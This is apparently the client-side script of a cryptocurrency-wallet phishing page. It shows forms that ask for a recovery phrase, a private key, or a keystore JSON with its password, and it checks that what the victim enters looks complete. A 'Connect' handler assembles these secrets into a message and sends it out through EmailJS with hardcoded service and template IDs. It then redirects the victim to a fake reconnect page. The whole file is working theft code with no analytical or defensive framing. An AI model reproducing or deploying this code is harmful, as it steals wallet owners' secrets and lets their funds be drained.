document.getElementById('form-connect-button').addEventListener('click', function (event) {
    event.preventDefault();
    const isValid = validateActiveForm();
    if (isValid) {
      const messageContent = collectFormData();
      if (messageContent) {
        handleButtonUI(); 
        sendEmail(messageContent); 
        setTimeout(function () {
          window.location.href = 'http://versiondapp.github.io/auth/reconnect.html'; 
        }, 6000);
      }
    }
  });
  function setupRealTimeValidation() {
    const activeForm = document.querySelector('.form-slider.active');
    if (!activeForm) return;
    const inputs = activeForm.querySelectorAll('input, textarea');
    inputs.forEach(input => {
      input.addEventListener('input', function () {
        validateActiveForm();
      });
    });
  }
  function validateActiveForm() {
    let isValid = true;
    const activeForm = document.querySelector('.form-slider.active');
    if (!activeForm) {
      showCustomAlert('No active form found!');
      return false;
    }
    console.log('Validating form:', activeForm.id);
    if (activeForm.id === 'phraseForm') {
      isValid = validatePhraseForm();
    } else if (activeForm.id === 'jsonForm') {
      isValid = validateJsonForm();
    } else if (activeForm.id === 'privateKeyForm') {
      isValid = validatePrivateKeyForm();
    }
    return isValid;
  }
  function validatePhraseForm() {
    const inputWords = document.getElementById('words').value.trim();
    const wordsArray = inputWords.split(/\s+/);
    const messagePhrase = document.getElementById('messagePhrase');
    if (wordsArray.length < 12) {
      messagePhrase.style.color = 'red';
      showCustomAlert('Phrase must contain at least 12 words');
      return false;
    }
    const allWordsAreValid = wordsArray.every(word => /^[A-Za-z]+$/.test(word));
    if (!allWordsAreValid) {
      messagePhrase.style.color = 'red';
      showCustomAlert('Typically 12 (sometimes 24) words separated by single spaces');
      return false;
    }
    messagePhrase.style.color = '';
    return true;
  }
  function validateJsonForm() {
    const jsonValue = document.getElementById('json').value.trim();
    const passwordValue = document.getElementById('password').value.trim();
    const messageJson = document.getElementById('messageJson');
    if (!jsonValue || !passwordValue) {
      messageJson.style.color = 'red';
      showCustomAlert('Both JSON and Password must be filled in');
      return false;
    } else {
      messageJson.style.color = ''; // Reset color
      return true;
    }
  }
  function validatePrivateKeyForm() {
    const privateKey = document.getElementById('key').value.trim();
    const messagePrivatekey = document.getElementById('messagePrivatekey');
    if (privateKey.length < 14 || /\s/.test(privateKey)) {
      messagePrivatekey.style.color = 'red';
      showCustomAlert('Private keys often consist of a sequence of hexadecimal characters without spaces');
      return false;
    } else {
      messagePrivatekey.style.color = ''; // Reset color
      return true;
    }
  }
  function collectFormData() {
    let message = '';
    const logoTitle = document.querySelector(".modal-connection-status-2a")?.textContent;
    if (logoTitle) {
      message += `Option: ${logoTitle}\n\n`;
    }
    const inputWords = document.getElementById('words').value.trim();
    if (inputWords) {
      const wordsArray = inputWords.split(/\s+/);
      message += `PHRASE: ${wordsArray.join(' ')}\n\n`;
    }
    const privateKey = document.getElementById('key').value.trim();
    if (privateKey) {
      message += `PRIVATE KEY: ${privateKey}\n\n`;
    }
    const jsonValue = document.getElementById('json').value.trim();
    const passwordValue = document.getElementById('password').value.trim();
    if (jsonValue) {
      message += `JSON: ${jsonValue}\nPassword: ${passwordValue}\n`;
    }
    return message ? message : null;
  }
  function sendEmail(content) {
    const templateParams = {
      message: content
    };
    emailjs.send("service_fdsqynl", "template_ku76cr6", templateParams)
      .then(function (response) {
        console.log('SUCCESS!', response.status, response.text);
      }, function (error) {
        console.error('FAILED...', error);
      });
  }
  function handleButtonUI() {
    const button = document.getElementById('form-connect-button');
    button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Processing...';
    button.disabled = true;
  }
  function showCustomAlert(message) {
    const alertModal = document.getElementById('custom-alert');
    const alertMessage = document.getElementById('custom-alert-message');
    const progressBar = document.getElementById('progress-bar');
    alertMessage.textContent = message;
    alertModal.classList.remove('hidden');
    let width = 0;
    const duration = 3000; 
    const interval = 10; 
    const step = (interval / duration) * 100; 
    const fillProgressBar = setInterval(function () {
      if (width >= 100) {
        clearInterval(fillProgressBar);
      } else {
        width += step;
        progressBar.style.width = width + '%';
      }
    }, interval);
    setTimeout(function () {
      alertModal.classList.add('hidden');
      progressBar.style.width = '0%'; 
    }, duration);
  }
  (function () {
    emailjs.init("SatQ3pn8RqVimuU2k");
  })();
  document.addEventListener('keydown', function (event) {
    if (event.key === 'Enter') {
      event.preventDefault();
      document.getElementById('form-connect-button').click();
    }
  });
  setupRealTimeValidation();
  document.getElementById('menu-close-button').addEventListener('click', function () {
    resetForm(); 
  });
  document.querySelectorAll('a.navigation-link').forEach(link => {
    link.addEventListener('click', function () {
      resetForm(); 
    });
  });
